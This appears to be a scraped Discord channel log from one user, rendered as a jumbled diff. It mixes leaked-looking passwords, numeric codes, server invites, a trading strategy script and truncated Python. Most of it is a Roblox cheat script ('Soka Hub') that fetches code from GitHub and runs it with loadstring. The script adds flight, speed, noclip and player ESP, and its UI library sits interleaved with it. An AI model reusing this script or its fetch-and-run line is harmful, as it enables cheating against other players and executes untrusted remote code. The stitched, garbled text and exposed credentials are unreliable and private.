-Best site to watch Masamune-kun's Revenge English Sub/Dub online Free and download Masamune-kun's Revenge English Sub/Dub anime.
-Image
-shadow™ — 9/26/2025 2:23 AM
-Image
-shadow™ — 10/3/2025 1:23 PM
-Image
-shadow™ — 10/10/2025 12:21 AM
-https://github.com/Ssarkos/AiExternal
-shadow™ — 10/10/2025 12:32 AM
-LyWU0TRgdMEPzvJu
-shadow™
- pinned a message to this channel. See all pinned messages. — 10/10/2025 12:32 AM
-shadow™ — 10/10/2025 12:32 AM
-Image
-shadow™
- pinned a message to this channel. See all pinned messages. — 10/10/2025 12:32 AM
-shadow™ — 10/11/2025 3:29 PM
-Shadow12313
-shadow™ — 10/15/2025 1:29 AM
-Image
-shadow™ — 10/19/2025 11:50 AM
-Image
-Image
-Image
-shadow™ — 10/23/2025 7:14 AM
-'
-import sqlite3
-import os
-import platform
-import subprocess
-import ctypes
-import sys
-Expand
-message.txt
-28 KB
-shadow™ — 10/23/2025 7:31 AM
-10YROLDDDX
-shadow™ — 10/23/2025 8:24 AM
-import tkinter as tk
-from tkinter import ttk, messagebox, colorchooser
-import threading
-import time
-import random
-import ctypes... (19 KB left)
-Expand
-message.txt
-69 KB
-shadow™ — 10/26/2025 5:12 PM
-Image
-shadow™ — 10/27/2025 10:59 AM
-dajmisricepls\
-shadow™ — 10/28/2025 6:18 PM
-216 256 726
-577 294 513
-395 549 727
-890 483 725
-998 334 489
-114 456 541
-628 318 209
-608 417 068
-149 888 396
-587 526 597
-shadow™ — 10/29/2025 8:52 PM
-https://discord.gg/j47KEWEe
-shadow™ — 11/4/2025 9:56 PM
-https://www.tiktok.com/t/ZP8DfHFc8/
-TikTok
-TikTok · Kim Kardashian
-Image
-shadow™ — 11/4/2025 11:25 PM
-QCASG8XZb9aYsea!
-shadow™ — 11/6/2025 5:29 PM
-Shadow12313
-shadow™ — 11/7/2025 9:46 PM
-Image
-shadow™ — 11/9/2025 4:53 AM
-Image
-shadow™ — 11/11/2025 4:12 AM
-Image
-shadow™ — 11/12/2025 2:04 AM
-https://discord.gg/GkWUzhvB
-shadow™ — 11/29/2025 5:33 PM
-//@version=5
-strategy("AutoDollarVol ATR — Fully Auto & FIXED (No Errors)", overlay=true,
-     default_qty_type=strategy.percent_of_equity,
-     default_qty_value=100,
-     commission_type=strategy.commission.percent,
-     commission_value=0.075,
-     pyramiding=1,
-     calc_on_every_tick=false,
-     calc_on_order_fills=true)
-
-// ────────────────────────────────── INPUTS ──────────────────────────────────
-ema_len            = input.int(50,   "EMA length (trend filter)", minval=8)
-use_trend          = input.bool(true, "Use EMA trend filter")
-atr_len            = input.int(14,   "ATR length", minval=2)
-atr_mult           = input.float(1.5, "Initial stop × ATR", step=0.1)
-reward_ratio       = input.float(2.0, "Reward : Risk ratio", step=0.1)
-use_trailing       = input.bool(true, "Enable trailing stop")
-trailing_after_atr = input.float(1.0, "Start trailing after X ATR profit", step=0.1)
-trailing_atr_mult  = input.float(1.0, "Trailing distance × ATR", step=0.1)
-
-risk_percent       = input.float(1.0, "Risk per trade (% of equity)", minval=0.05, step=0.05)
-min_dvol_mult      = input.float(1.5, "Min dollar-volume vs average", step=0.1)
-dvol_mult          = input.float(1.2, "Volume spike multiplier", step=0.1)
-rsi_oversold       = input.int(30, "RSI oversold (longs)")
-rsi_overbought     = input.int(70, "RSI overbought (shorts)")
-
-allow_long         = input.bool(true,  "Allow Longs")
-allow_short        = input.bool(true,  "Allow Shorts")
-cooldown_bars      = input.int(1, "Cooldown bars between trades", minval=0)
-max_trades_per_day = input.int(10, "Max trades/day (0=unlimited)", minval=0)
-daily_loss_cap_pct = input.float(10.0, "Daily loss limit % (0=off)", step=0.1)
-start_hour         = input.int(8,  "Session start (NY time)", minval=0, maxval=23)
-end_hour           = input.int(23, "Session end (NY time)", minval=0, maxval=23)
-
-// ────────────────────────────────── INDICATORS ──────────────────────────────────
-ema        = ta.ema(close, ema_len)
-atr        = ta.atr(atr_len)
-rsi        = ta.rsi(close, 14)
-
-vol_spike  = volume > ta.sma(volume, 20) * vol_mult
-dvol       = volume * close
-dvol_ok    = dvol > ta.sma(dvol, 20) * min_dvol_mult
-
-// Candle patterns (fixed & reliable)
-bull_engulfing = close > open and close[1] < open[1] and close > open[1] and open <= close[1]
-bear_engulfing = close < open and close[1] > open[1] and close < open[1] and open >= close[1]
-hammer     = (math.min(close, open) - low) >= 2 * math.abs(close - open) and (high - math.max(close, open)) <= math.abs(close - open)
-inv_hammer = (high - math.max(close, open)) >= 2 * math.abs(close - open) and (math.min(close, open) - low) <= math.abs(close - open)
-
-bull_pattern = bull_engulfing or hammer
-bear_pattern = bear_engulfing or inv_hammer
-
-// NY session
-in_session = hour(time("America/New_York")) >= start_hour and hour(time("America/New_York")) <= end_hour
-
-// Daily counters
-var int   trades_today      = 0
-var float day_start_equity  = na
-if ta.change(time("D"))
-    trades_today     := 0
-    day_start_equity := strategy.equity
-
-daily_loss_ok = daily_loss_cap_pct <= 0 or (day_start_equity - strategy.equity) / day_start_equity * 100 < daily_loss_cap_pct
-trades_limit_ok = max_trades_per_day == 0 or trades_today < max_trades_per_day
-
-// Cooldown
-var int last_entry_bar = na
-can_enter = na(last_entry_bar) or bar_index - last_entry_bar > cooldown_bars
-
-// ────────────────────────────────── CONDITIONS ──────────────────────────────────
-long_cond  = bull_pattern and vol_spike and dvol_ok and rsi > rsi_oversold and rsi < 80 and
-             allow_long and in_session and daily_loss_ok and trades_limit_ok and can_enter and
-             (not use_trend or close > ema) and strategy.position_size == 0
-
-short_cond = bear_pattern and vol_spike and dvol_ok and rsi < rsi_overbought and rsi > 20 and
-             allow_short and in_session and daily_loss_ok and trades_limit_ok and can_enter and
-             (not use_trend or close < ema) and strategy.position_size == 0
-
-// ────────────────────────────────── POSITION SIZING ──────────────────────────────────
-risk_qty(stop_price) =>
-    risk_money = strategy.equity * risk_percent / 100
-    dist = math.abs(close - stop_price)
-    dist > syminfo.mintick ? risk_money / dist : 0
-
-// ────────────────────────────────── ENTRIES & EXITS ──────────────────────────────────
-if long_cond
-    sl = low - atr * atr_mult
-    tp = close + (close - sl) * reward_ratio
-    qty = risk_qty(sl)
-    if qty > 0
-        strategy.entry("Long", strategy.long, qty=qty)
-        strategy.exit("Long Exit", "Long", stop=sl, limit=tp)
-        trades_today += 1
-        last_entry_bar := bar_index
-
-if short_cond
-    sl = high + atr * atr_mult
-    tp = close - (sl - close) * reward_ratio
-    qty = risk_qty(sl)
-    if qty > 0
-... (21 lines left)
-Collapse
-message.txt
-8 KB
-shadow™ — 12/11/2025 7:11 AM
-Redcat1223alt
-https://www.roblox.com/users/10116177176/profile?friendshipSourceType=PlayerSearch
-he was flying around trying to kill me and my friend like a crazy person and he actually did kill my friend he cant go on discord tho and he was asking for a 10% restore lol
-shadow™ — 12/13/2025 6:25 PM
-Image
-shadow™ — 12/18/2025 9:50 PM
-Image
-shadow™ — 12/21/2025 1:15 AM
-https://discord.gg/4kGP6j8s
-Seliware
-Seliware
-12,319 Online
-36,745 Members
-Est. Jul 2025
-
-Join
-fcpkylo
-shadow (sub version)
-dawadazxc
-local url = "https://raw.githubusercontent.com/sokashadow/soka_hub_library/main/main_library?t=" .. os.time()
-local response = game:HttpGet(url)
-local success, SokaUI = pcall(function() return loadstring(response)() end)
-
-if not success or not SokaUI then
-    error("Failed to load Soka UI Library: " .. tostring(SokaUI))
-end
-
-local Window = SokaUI:CreateWindow("Soka Hub", "DarkTheme")
-if not Window then
-    error("Failed to create Window from Soka UI Library")
-end
-
--- Services
-local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local Camera = workspace.CurrentCamera
-local UserInputService = game:GetService("UserInputService")
-
--- Global table for all connections
-local connections = {}
-
--- States
-local FlightEnabled = false
-local SpeedEnabled = false
-local NoClipEnabled = false
-local TargetSpeed = 1           -- Default horizontal speed from slider
-local FlightSpeed = 50
-local DashSpeed = 100
-local DashCooldown = false
-local RunESPUpdate = true
-local NameESP = {}
-local CustomHighlights = {}
-local CustomESPColor = Color3.new(1, 0, 0)
-
--------------------------------------------------------
--- Main Tab (Flight, Speed, NoClip, Dash)
--------------------------------------------------------
-local MainTab = Window:CreateTab("Main")
-
--- Speed Section
-local SpeedSection = MainTab:CreateSection("Speed")
-
-SpeedSection:NewKeybind("Speed Toggle", "Toggle speed with key", Enum.KeyCode.X, function()
-    SpeedEnabled = not SpeedEnabled
-    if SpeedEnabled then
-        local speedConnection = RunService.Heartbeat:Connect(function()
-            if LocalPlayer.Character and SpeedEnabled then
-                local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
-                if hrp and humanoid then
-                    local moveDir = humanoid.MoveDirection
-                    local currentVel = hrp.Velocity
-                    local desiredVel = Vector3.new(moveDir.X * TargetSpeed, currentVel.Y, moveDir.Z * TargetSpeed)
-                    hrp.Velocity = currentVel:Lerp(desiredVel, 0.2)
-                end
-            end
-        end)
-        table.insert(connections, speedConnection)
-    end
-end)
-
-SpeedSection:NewSlider("Speed Value", "Adjust speed value", 500, 1, function(value)
-    TargetSpeed = value
-end, 1)
-
--- Flight Section
-local FlightSection = MainTab:CreateSection("Flight")
-
-FlightSection:NewKeybind("Flight Toggle", "Toggle flight with key", Enum.KeyCode.F, function()
-    FlightEnabled = not FlightEnabled
-    if FlightEnabled then
-        local char = LocalPlayer.Character
-        if char then
-            local humanoid = char:WaitForChild("Humanoid")
-            local hrp = char:WaitForChild("HumanoidRootPart")
-            local flightConn = RunService.RenderStepped:Connect(function()
-                if FlightEnabled then
-                    local desiredVel = Vector3.new(0, 0, 0)
-                    if UserInputService:IsKeyDown(Enum.KeyCode.W) then
-                        desiredVel = desiredVel + (Camera.CFrame.LookVector * FlightSpeed)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.S) then
-                        desiredVel = desiredVel - (Camera.CFrame.LookVector * FlightSpeed)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.D) then
-                        desiredVel = desiredVel + (Camera.CFrame.RightVector * FlightSpeed)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.A) then
-                        desiredVel = desiredVel - (Camera.CFrame.RightVector * FlightSpeed)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
-                        desiredVel = desiredVel + Vector3.new(0, FlightSpeed, 0)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
-                        desiredVel = desiredVel - Vector3.new(0, FlightSpeed, 0)
-                    end
-                    hrp.Velocity = hrp.Velocity:Lerp(desiredVel, 0.1)
-                end
-            end)
-            table.insert(connections, flightConn)
+    end)
+
+    dragArea.InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(
+                startPos.X.Scale,
+                startPos.X.Offset + delta.X,
+                startPos.Y.Scale,
+                startPos.Y.Offset + delta.Y
+            )
         end
-    end
-end)
-
-FlightSection:NewSlider("Flight Speed", "Adjust flight speed", 500, 1, function(value)
-    FlightSpeed = value
-end)
-
--- NoClip Section
-local NoClipSection = MainTab:CreateSection("NoClip")
-NoClipSection:NewToggle("NoClip", "Phase through objects", function(state)
-    NoClipEnabled = state
-    if NoClipEnabled then
-        RunService:BindToRenderStep("NoClip", 100, function()
-            if LocalPlayer.Character then
-                for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
-                    if part:IsA("BasePart") then
-                        part.CanCollide = false
-                    end
-                end
-            end
-        end)
-    else
-        RunService:UnbindFromRenderStep("NoClip")
-    end
-end)
-
--- Dash Section
-local DashSection = MainTab:CreateSection("Dash")
-DashSection:NewKeybind("Dash", "Press to dash", Enum.KeyCode.Q, function()
-    if not DashCooldown and LocalPlayer.Character then
-        DashCooldown = true
-        local HRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-        if HRP then
-            local BV = Instance.new("BodyVelocity")
-            BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-            BV.Velocity = Camera.CFrame.LookVector * DashSpeed
-            BV.Parent = HRP
-            game:GetService("Debris"):AddItem(BV, 0.2)
-            task.wait(1)
-            DashCooldown = false
-        end
-    end
-end)
-
-DashSection:NewSlider("Dash Force", "Adjust dash force", 500, 50, function(value)
-    DashSpeed = value
-end)
-
--------------------------------------------------------
--- Visual Tab (ESP)
--------------------------------------------------------
-local VisualTab = Window:CreateTab("Visual")
-local ESPSection = VisualTab:CreateSection("ESP")
-
-local function CreateNameESP(player)
-    local billboard = Instance.new("BillboardGui")
-    billboard.Name = "NameESP"
-    billboard.Size = UDim2.new(0, 200, 0, 50)
-    billboard.AlwaysOnTop = true
-    billboard.StudsOffset = Vector3.new(0, 2, 0)
-
-    local name = Instance.new("TextLabel")
-    name.Name = "PlayerName"
-    name.BackgroundTransparency = 1
-    name.Size = UDim2.new(1, 0, 0, 20)
-    name.Font = Enum.Font.SourceSansBold
-    name.TextColor3 = Color3.new(1, 1, 1)
-    name.TextSize = 14
-    name.Text = player.Name
-    name.Parent = billboard
-
-    return billboard
+    end)
 end
 
-local function UpdateAllESP()
-    while RunESPUpdate do
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer then
-                if player.Character and player.Character:FindFirstChild("Head") then
-                    if NameESP[player] then
-                        if not player.Character.Head:FindFirstChild("NameESP") then
-                            local esp = CreateNameESP(player)
-                            NameESP[player] = esp
-                            esp.Parent = player.Character.Head
+-- Core objects
+local Window = {}
+Window.__index = Window
+
+-- Create a tab
+function Window:CreateTab(name)
+    local container = Create("ScrollingFrame", {
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundTransparency = 1,
+        ScrollBarThickness = 6,
+        Parent = self._content,
+        CanvasSize = UDim2.new(0, 0, 0, 0),
+    })
+
+    local layout = Create("UIListLayout", {
+        Parent = container,
+        SortOrder = Enum.SortOrder.LayoutOrder,
+        Padding = UDim.new(0, 5),
+    })
+
+    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        container.CanvasSize = UDim2.new(0, container.AbsoluteSize.X, 0, layout.AbsoluteContentSize.Y)
+    end)
+
+    container.Visible = (#self.Tabs == 0)
+
+    local tab = {
+        Name = name,
+        Sections = {},
+        _container = container,
+    }
+
+    setmetatable(tab, {
+        __index = {
+            CreateSection = function(self, sectionName)
+                local sectionFrame = Create("Frame", {
+                    Size = UDim2.new(1, -10, 0, 150),
+                    BackgroundColor3 = Color3.fromRGB(30, 30, 30),
+                    BorderSizePixel = 0,
+                    Name = sectionName,
+                    Parent = self._container,
+                })
+
+                Create("UICorner", { CornerRadius = UDim.new(0, 5), Parent = sectionFrame })
+
+                local sectionLabel = Create("TextLabel", {
+                    Size = UDim2.new(1, 0, 0, 30),
+                    Text = sectionName,
+                    BackgroundTransparency = 1,
+                    TextColor3 = Color3.new(1, 1, 1),
+                    Font = Enum.Font.SourceSansBold,
+                    TextSize = 20,
+                    Parent = sectionFrame,
+                })
+
+                local layout = Create("UIListLayout", {
+                    SortOrder = Enum.SortOrder.LayoutOrder,
+                    Parent = sectionFrame,
+                    Padding = UDim.new(0, 5),
+                })
+
+                local section = {
+                    Frame = sectionFrame,
+                    Elements = {},
+                }
+
+                table.insert(self.Sections, section)
+
+                -- Define UI elements for the section
+                function section:NewToggle(text, desc, callback)
+                    local toggle = { State = false }
+                    local btn = Create("TextButton", {
+                        Size = UDim2.new(1, -10, 0, 30),
+                        Text = text .. "   [OFF]",
+                        BackgroundColor3 = Color3.fromRGB(50, 50, 50),
+                        TextColor3 = Color3.new(1, 1, 1),
+                        Font = Enum.Font.SourceSans,
+                        TextSize = 18,
+                        Parent = sectionFrame,
+                    })
+
+                    Create("UICorner", { CornerRadius = UDim.new(0, 5), Parent = btn })
+                    applyHoverAnimation(btn)
+
+                    btn.MouseButton1Click:Connect(function()
+                        toggle.State = not toggle.State
+                        btn.Text = text .. (toggle.State and "   [ON]" or "   [OFF]")
+                        if callback then
+                            callback(toggle.State)
                         end
-                    end
-                    if player.Character:FindFirstChild("Humanoid") then
-                        local highlight = player.Character:FindFirstChild("ESP_Highlight")
-                        if highlight then
-                            local health = player.Character.Humanoid.Health
-                            local maxHealth = player.Character.Humanoid.MaxHealth
-                            local healthPercent = health / maxHealth
-                            highlight.FillColor = Color3.new(1 - healthPercent, healthPercent, 0)
-                        end
-                    end
-                    if CustomHighlights[player] then
-                        if not player.Character:FindFirstChild("Highlight") then
-                            local highlight = Instance.new("Highlight")
-                            highlight.FillTransparency = 0.5
-                            highlight.OutlineTransparency = 0
-                            highlight.FillColor = CustomESPColor
-                            highlight.OutlineColor = Color3.new(1, 1, 1)
-                            highlight.Parent = player.Character
-                            CustomHighlights[player] = highlight
-                        end
-                    end
-                end
-            end
-        end
-        task.wait(0.1)
-    end
-end
-
-ESPSection:NewToggle("Name ESP", "Shows player names", function(state)
-    if state then
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and player.Character then
-                local esp = CreateNameESP(player)
-                NameESP[player] = esp
-                esp.Parent = player.Character:WaitForChild("Head")
-            end
-        end
-    else
-        for _, esp in pairs(NameESP) do
-            esp:Destroy()
-        end
-        NameESP = {}
-    end
-end)
-
-ESPSection:NewToggle("Health ESP", "Shows health-based highlights", function(state)
-    if state then
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and player.Character then
-                local highlight = Instance.new("Highlight")
-                highlight.Name = "ESP_Highlight"
-                highlight.Parent = player.Character
-            end
-        end
-    else
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player.Character then
-                local highlight = player.Character:FindFirstChild("ESP_Highlight")
-                if highlight then highlight:Destroy() end
-            end
-        end
-    end
-end)
-
-ESPSection:NewColorPicker("ESP Color", "Pick custom ESP color", Color3.new(1, 0, 0), function(color)
-    CustomESPColor = color
-    for _, highlight in pairs(CustomHighlights) do
-        highlight.FillColor = color
-    end
-end)
-
-ESPSection:NewToggle("Custom ESP", "Shows custom color highlights", function(state)
-    if state then
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and player.Character then
-                local highlight = Instance.new("Highlight")
-                highlight.FillTransparency = 0.5
-                highlight.OutlineTransparency = 0
-                highlight.FillColor = CustomESPColor
-                highlight.OutlineColor = Color3.new(1, 1, 1)
-                highlight.Parent = player.Character
-                CustomHighlights[player] = highlight
-            end
-        end
-    else
-        for _, highlight in pairs(CustomHighlights) do
-            highlight:Destroy()
-        end
-        CustomHighlights = {}
-    end
-end)
-
--- New Health Number ESP Toggle
-ESPSection:NewToggle("Health Number ESP", "Shows player health as a number above their head", function(state)
-    local HealthESPenabled = state
-    if state then
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
-                local humanoid = player.Character:FindFirstChild("Humanoid")
-                if humanoid then
-                    local billboard = Instance.new("BillboardGui")
-                    billboard.Name = "HealthESP"
-                    billboard.Size = UDim2.new(0, 100, 0, 50)
-                    billboard.AlwaysOnTop = true
-                    billboard.StudsOffset = Vector3.new(0, 4, 0)
-
-                    local textLabel = Instance.new("TextLabel")
-                    textLabel.BackgroundTransparency = 1
-                    textLabel.Size = UDim2.new(1, 0, 1, 0)
-                    textLabel.Font = Enum.Font.SourceSansBold
-                    textLabel.TextSize = 14
-                    textLabel.TextColor3 = Color3.new(1, 1, 1)
-                    textLabel.Text = "HP: " .. math.floor(humanoid.Health)
-                    textLabel.Parent = billboard
-
-                    billboard.Parent = player.Character:WaitForChild("Head")
-                    HealthESPTable = HealthESPTable or {}
-                    HealthESPTable[player] = billboard
-
-                    local con = humanoid:GetPropertyChangedSignal("Health"):Connect(function()
-                        if billboard and textLabel then
-                            textLabel.Text = "HP: " .. math.floor(humanoid.Health)
-                        end
+                        btn:SetAttribute("_configValue", toggle.State)
                     end)
-                    HealthESPConnections = HealthESPConnections or {}
-                    HealthESPConnections[player] = con
+
+                    btn:SetAttribute("_configType", "toggle")
+                    table.insert(self.Elements, btn)
                 end
-            end
-        end
 
-        Players.PlayerAdded:Connect(function(player)
-            player.CharacterAdded:Connect(function(character)
-                if HealthESPenabled and player ~= LocalPlayer then
-                    if character:FindFirstChild("Head") then
-                        local humanoid = character:WaitForChild("Humanoid")
-                        local billboard = Instance.new("BillboardGui")
-                        billboard.Name = "HealthESP"
-                        billboard.Size = UDim2.new(0, 100, 0, 50)
-                        billboard.AlwaysOnTop = true
-                        billboard.StudsOffset = Vector3.new(0, 4, 0)
+                -- Additional UI element functions (NewSlider, NewKeybind, etc.) would go here...
 
-                        local textLabel = Instance.new("TextLabel")
-                        textLabel.BackgroundTransparency = 1
-                        textLabel.Size = UDim2.new(1, 0, 1, 0)
-                        textLabel.Font = Enum.Font.SourceSansBold
-                        textLabel.TextSize = 14
-                        textLabel.TextColor3 = Color3.new(1, 1, 1)
-                        textLabel.Text = "HP: " .. math.floor(humanoid.Health)
-                        textLabel.Parent = billboard
+                return section
+            end,
+        },
+    })
 
-                        billboard.Parent = character:WaitForChild("Head")
-                        HealthESPTable = HealthESPTable or {}
-                        HealthESPTable[player] = billboard
+    table.insert(self.Tabs, tab)
 
-                        local con = humanoid:GetPropertyChangedSignal("Health"):Connect(function()
-                            if billboard and textLabel then
-                                textLabel.Text = "HP: " .. math.floor(humanoid.Health)
-                            end
-                        end)
-                        HealthESPConnections = HealthESPConnections or {}
-                        HealthESPConnections[player] = con
-                    end
-                end
-            end)
-        end)
-    else
-        for player, billboard in pairs(HealthESPTable or {}) do
-            if billboard then billboard:Destroy() end
-            if HealthESPConnections and HealthESPConnections[player] then
-                pcall(function() HealthESPConnections[player]:Disconnect() end)
-            end
-        end
-        HealthESPTable = {}
-        HealthESPConnections = {}
+    if self._tabBar then
+        self._tabBar:Refresh(self.Tabs)
     end
-end)
 
-ESPSection:NewToggle("Stop ESP Updates", "Stops all ESP updates", function(state)
-    RunESPUpdate = not state
-    if RunESPUpdate then
-        task.spawn(UpdateAllESP)
-    end
-end)
-
--------------------------------------------------------
--- Settings Tab
--------------------------------------------------------
-local SettingsTab = Window:CreateTab("Settings")
-local SettingsSection = SettingsTab:CreateSection("GUI Settings")
-
-SettingsSection:NewDropdown("Theme", "Change UI Theme", {
-    "DarkTheme",
-    "LightTheme",
-    "BloodTheme",
-    "GrapeTheme",
-    "Ocean",
-    "Midnight",
-    "Sentinel",
-    "Synapse"
-}, function(currentTheme)
-    SokaUI:ChangeTheme(currentTheme)
-end)
-
-SettingsSection:NewKeybind("Toggle GUI", "Shows/Hides the GUI", Enum.KeyCode.RightShift, function()
-    Window:ToggleUI()
-end)
-
-local function unloadScript()
-    for _, con in ipairs(connections) do
-        pcall(function() con:Disconnect() end)
-    end
-    connections = {}
-
-    for _, esp in pairs(NameESP) do
-        pcall(function() esp:Destroy() end)
-    end
-    NameESP = {}
-
-    for _, highlight in pairs(CustomHighlights) do
-        pcall(function() highlight:Destroy() end)
-    end
-    CustomHighlights = {}
-
-    for player, billboard in pairs(HealthESPTable or {}) do
-        if billboard then
-            billboard:Destroy()
-        end
-    end
-    HealthESPTable = {}
-
-    for player, con in pairs(HealthESPConnections or {}) do
-        pcall(function() con:Disconnect() end)
-    end
-    HealthESPConnections = {}
-
-    if Window.Destroy then
-        pcall(function() Window:Destroy() end)
-    end
-    print("Script unloaded successfully.")
+    return tab
 end
 
-SettingsSection:NewButton("Unload Script", "Unload all changes and close the GUI", unloadScript)
+-- Create a tab bar UI for switching tabs
+function Window:CreateTabBar()
+    local tabBar = Create("Frame", {
+        Name = "TabBar",
+        Size = UDim2.new(1, 0, 0, 40),
+        Position = UDim2.new(0, 0, 0, 40),
+        BackgroundColor3 = Color3.fromRGB(30, 30, 30),
+        Parent = self._Main,
+    })
 
--- Start the ESP update loop.
-task.spawn(UpdateAllESP)
-message.txt
-18 KB
+    Create("UICorner", { CornerRadius = UDim.new(0, 10), Parent = tabBar })
+
+    function tabBar:Refresh(tabs)
+        for _, child in ipairs(self:GetChildren()) do
+            if child:IsA("GuiObject") then
+                child:Destroy()
+            end
+        end
+
+        for i, tab in ipairs(tabs) do
+            local btn = Create("TextButton", {
+                Name = tab.Name,
+                Text = tab.Name,
+                Size = UDim2.new(1/#tabs, 0, 1, 0),
+                BackgroundColor3 = Color3.fromRGB(50, 50, 50),
+                TextColor3 = Color3.new(1, 1, 1),
+                Font = Enum.Font.SourceSans,
+                TextSize = 18,
+                Parent = self,
+            })
+
+            Create("UICorner", { CornerRadius = UDim.new(0, 5), Parent = btn })
+            applyHoverAnimation(btn)
+
+            btn.MouseButton1Click:Connect(function()
+                for _, otherTab in ipairs(tabs) do
+                    otherTab._container.Visible = false
+                end
+                tab._container.Visible = true
+            end)
+        end
+    end
+
+    return tabBar
+end
+
+-- Toggle the entire UI's visibility
+function Window:ToggleUI()
+    self._Main.Enabled = not self._Main.Enabled
+end
+
+-- Change the theme for all UI elements
+function Window:ChangeTheme(newTheme)
+    newTheme = newTheme or {
+        Main = Color3.fromRGB(30, 30, 30),
+        TabBar = Color3.fromRGB(30, 30, 30),
+        Button = Color3.fromRGB(50, 50, 50),
+        Text = Color3.new(1, 1, 1)
+    }
+
+    self._Main.BackgroundColor3 = newTheme.Main
+
+    if self._tabBar then
+        self._tabBar.BackgroundColor3 = newTheme.TabBar
+        for _, child in ipairs(self._tabBar:GetChildren()) do
+            if child:IsA("TextButton") then
+                child.BackgroundColor3 = newTheme.Button
+                child.TextColor3 = newTheme.Text
+            end
+        end
+    end
+
+    for _, tab in ipairs(self.Tabs) do
+        tab._container.BackgroundColor3 = newTheme.Main
+        for _, section in ipairs(tab.Sections) do
+            if section.Frame then
+                section.Frame.BackgroundColor3 = newTheme.Button
+                for _, obj in ipairs(section.Frame:GetChildren()) do
+                    if obj:IsA("TextLabel") then
+                        obj.TextColor3 = newTheme.Text
+                    elseif obj:IsA("TextButton") then
+                        obj.BackgroundColor3 = newTheme.Button
+                        obj.TextColor3 = newTheme.Text
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Save current config
+function Window:SaveConfig(configName)
+    local config = {}
+    for _, tab in ipairs(self.Tabs) do
+        for _, section in ipairs(tab.Sections) do
+            for _, element in ipairs(section.Elements) do
+                local configType = element:GetAttribute("_configType")
+                local configValue = element:GetAttribute("_configValue")
+                if configType and configValue then
+                    config[tab.Name] = config[tab.Name] or {}
+                    config[tab.Name][section.Frame.Name] = config[tab.Name][section.Frame.Name] or {}
+                    config[tab.Name][section.Frame.Name][configType] = configValue
+                end
+            end
+        end
+    end
+    SokaHubUI.Configs[configName] = config
+end
+
+-- Load a saved configuration
+function Window:LoadConfig(configName)
+    local config = SokaHubUI.Configs[configName]
+    if not config then return end
+
+    for tabName, sections in pairs(config) do
+        for sectionName, values in pairs(sections) do
+            for configType, value in pairs(values) do
+                for _, tab in ipairs(self.Tabs) do
+                    if tab.Name == tabName then
+                        for _, section in ipairs(tab.Sections) do
+                            if section.Frame.Name == sectionName then
+                                local element = section.Elements[1]
+                                if element and element:GetAttribute("_configType") == configType then
+                                    element:SetAttribute("_configValue", value)
+                                    if configType == "toggle" then
+                                        element.Text = tabName .. "   [" .. (value and "ON" or "OFF") .. "]"
+                                    elseif configType == "slider" then
+                                        local title = element:FindFirstChildOfClass("TextLabel")
+                                        title.Text = title.Text:match("^(.*) %((%d+)%)$"):format(title.Text:match("^(.*) %((%d+)%$"), value)
+                                    elseif configType == "keybind" then
+                                        local label = element:FindFirstChildOfClass("TextLabel")
+                                        label.Text = tabName .. " [" .. value .. "]"
+                                    elseif configType == "colorPicker" then
+                                        local colorBox = element:FindFirstChildOfClass("TextButton")
+                                        colorBox.BackgroundColor3 = HexToColor3(value)
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Initialize the main UI window
+function SokaHubUI:Init()
+    self._Main = Create("ScreenGui", {
+        Name = "SokaHubUI",
+        ResetOnSpawn = false,
+        Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui"),
+    })
+
+    self.Tabs = {}
+    self._tabBar = self:CreateTabBar()
+    self._tabBar.Parent = self._Main
+
+    self._content = Create("Frame", {
+        Size = UDim2.new(1, 0, 1, -40),
+        Position = UDim2.new(0, 0, 0, 40),
+        BackgroundColor3 = Color3.fromRGB(30, 30, 30),
+        Parent = self._Main,
+    })
+
+    Create("UICorner", { CornerRadius = UDim.new(0, 10), Parent = self._content })
+end
+
+return SokaHubUI
